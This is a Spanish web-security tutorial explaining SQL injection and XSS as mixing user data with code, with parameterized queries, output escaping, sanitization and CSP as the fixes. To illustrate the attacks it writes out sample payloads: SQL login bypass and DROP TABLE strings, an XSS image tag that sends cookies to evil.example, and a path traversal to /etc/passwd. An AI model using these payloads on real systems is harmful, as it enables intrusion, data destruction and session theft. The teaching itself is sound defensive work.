---
title: Inyección SQL y XSS
description: Las dos inyecciones que llevan veinte años en el top de vulnerabilidades, su causa común y las defensas que las eliminan de raíz.
category: seguridad
level: fundamentos
tags: [sqli, xss, validacion, owasp]
updated: 2026-07-22
order: 2
---

La inyección SQL y el XSS parecen ataques distintos — uno golpea tu base de datos, el otro el navegador de tus usuarios — pero son **el mismo error con dos disfraces**: tu aplicación mezcló *datos* de un desconocido con *código* que algo va a ejecutar, y el intérprete no puede distinguirlos. Entiende esa raíz y las defensas dejan de ser recetas para memorizar.

## Inyección SQL: datos que se convierten en consulta

Construyes la consulta concatenando lo que llegó del formulario:

```ts
// ❌ El texto del usuario ES parte del código SQL
const q = `SELECT * FROM usuarios WHERE email = '${email}' AND pass_hash = '${hash}'`;
```

Un atacante no escribe un email — escribe **sintaxis**:

```
email:  ' OR '1'='1' --
        └── la consulta resultante:
SELECT * FROM usuarios WHERE email = '' OR '1'='1' -- ' AND pass_hash = '...'
```

`'1'='1'` es siempre cierto y `--` comenta el resto: la consulta devuelve la tabla entera y el atacante entra sin contraseña. Con variantes (`'; DROP TABLE usuarios; --`, `UNION SELECT ...`) se leen tablas ajenas o se destruyen.

### La defensa: consultas parametrizadas

```ts
// ✅ El SQL y los datos viajan por canales separados
const q = 'SELECT * FROM usuarios WHERE email = $1 AND pass_hash = $2';
await pool.query(q, [email, hash]);
```

Con **parámetros** (`$1`, `?` según el driver), la base de datos compila la consulta primero y recibe los datos después, ya como valores puros: el texto del atacante **no puede convertirse en sintaxis**, contenga lo que contenga. No es un filtro que se pueda esquivar — es un cambio de canal.

Los ORMs (Prisma, TypeORM, Sequelize) parametrizan por defecto; el riesgo regresa por sus puertas traseras (`$queryRawUnsafe`, `sequelize.query` con plantillas). Regla absoluta: **jamás construyas SQL concatenando texto del usuario** — ni "solo por esta vez", ni escapando a mano.

## XSS: datos que se convierten en script

La misma jugada, con el navegador como intérprete. Tu página muestra un comentario:

```ts
// ❌ El comentario ES parte del HTML
divComentarios.innerHTML = `<p>${comentario}</p>`;
```

El "comentario" del atacante:

```html
<img src=x onerror="fetch('https://evil.example/robar?c=' + document.cookie)">
```

Ese script corre **en el navegador de cada visitante**, con la sesión de la víctima: puede robar cookies, leer lo que la víctima ve o actuar en su nombre. Y si el comentario quedó guardado en tu base de datos (*XSS almacenado*), infecta a todos los que pasen.

### La defensa: escapar en la salida (y dejar que el framework lo haga)

```ts
// ✅ textContent trata el texto como texto, siempre
parrafo.textContent = comentario;
```

La regla de oro es **escapar en el punto de salida**: convertir `<` en `&lt;` justo cuando el dato entra en HTML. Los frameworks modernos (React, Vue, Svelte, Astro) lo hacen por defecto en sus plantillas — el XSS moderno casi siempre entra por las escotillas que lo desactivan: `dangerouslySetInnerHTML`, `v-html`, `innerHTML` a mano. Trátalas como material radiactivo.

- ¿Necesitas HTML enriquecido del usuario (un editor)? **Sanitiza** con una librería de allowlist (DOMPurify) — nunca con regex propias.
- **CSP** (Content-Security-Policy) como red de seguridad: aunque un script se cuele, el navegador se niega a ejecutarlo o a mandarlo a dominios ajenos.
- Cookies de sesión con `HttpOnly` — invisible para JavaScript — para que un XSS no pueda robarlas, como viste en [autenticación](/temas/seguridad/autenticacion-y-autorizacion/).

## Validar y escapar no son lo mismo

<aside class="callout callout-aviso">
<p class="callout-titulo">Aviso</p>

**Validar** (¿es un email? ¿tiene menos de 200 caracteres?) pasa en la **entrada** y protege tu lógica de negocio. **Escapar/parametrizar** pasa en la **salida** y protege al intérprete. La primera no sustituye a la segunda: «O'Brien» es un apellido perfectamente válido… y rompe tu SQL concatenado. Necesitas ambas, cada una en su sitio.
</aside>

## La lista completa de intérpretes

La misma raíz produce inyección allá donde haya un intérprete escuchando: comandos de shell (`exec('convert ' + nombreFichero)`), rutas de fichero (`../../etc/passwd`), cabeceras HTTP, incluso los prompts de un LLM. La pregunta defensiva es siempre la misma: **¿este dato de fuera llega a algún intérprete? ¿Por qué canal?** Si viaja mezclado con el código, tienes una inyección esperando su momento.

Por eso *Injection* lleva desde 2003 sin salir del OWASP Top 10 — no es un bug exótico: es el error más natural del mundo, cometido en cada lenguaje nuevo, en cada plantilla nueva, por cada generación nueva. Ahora ya no por ti.

<div data-widget="mini-quiz" data-count="3"></div>
